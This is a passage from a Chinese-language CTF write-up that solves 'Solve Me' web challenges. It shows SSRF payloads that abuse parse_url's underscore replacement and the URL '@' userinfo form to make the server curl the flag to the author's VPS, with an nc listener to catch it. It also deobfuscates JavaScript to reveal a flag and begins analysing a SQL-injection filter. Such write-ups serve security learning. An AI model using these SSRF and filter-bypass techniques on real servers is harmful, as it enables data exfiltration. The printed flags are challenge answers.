class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ：<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>然后在服务器上面开监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>就可以接收到返回的flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里发现这段代码的逻辑是用get方法接受一个参数url，而这个参数要经过三次的检测，第一次会把含有下划线，空白字符过滤掉，第二次过滤检验的是是否满足url的格式，而且必须含有<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>里面的内容也就是<code>http://givemealink.solveme.peng.kr/</code>，而第三次则判断路径下是否含有<code>plz_give_me</code>这个字段，突然发现这个东西跟第一个过滤下划线的自相矛盾，查一下PHP文档，问题出现在parse_url这个函数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>非法字符在这个函数下会自动替换成下划线，测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现这时候就可以利用这一点成功绕过第一个过滤，以及满足第三个过滤<br>这时候考虑第二个过滤，继续查看parse_url这个函数文档你会发现他有这样一个例子，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>这也是url的一种写法，现在感觉很少用在http服务上感觉在ssh连接自己的服务器上面用的多，因为一般的url都是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>但是平常我们连接自己服务器的时候可以这样<code>ssh root@vps_ip</code> 然后输入密码，这应该也是这种类型的<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>然后这里的话相当于username还有password没有任何实际作用，纯粹就是用来写那个$_SERVER[‘HTTP_HOST’]来进行绕过的<br>payload：<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>我们再测试一下，结果完全符合我们绕过的要求<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就利用那一个<code>curl_setopt</code>函数往我们这边服务器发送flag了，vps这边监听80端口,出现flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>点开发现存在一大堆Js混淆代码，解码一看发现有一堆数字很可疑<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>写个小脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单说一下这段代码的意思，就是传进两个参数，然后进行过滤，然后进行数据库的查找，查找的结果里面如果含有<code>31337</code>的就可以成功输出flag了</p><p>这段代码里面有一个很吓唬人的过滤准则，但是其实里面存在小漏洞<br>    首先过滤了单引号啥的，注入一个单引号行不通，但是我们可以去掉一个单引号，如果要正则匹配\的话，正确的写法应该是 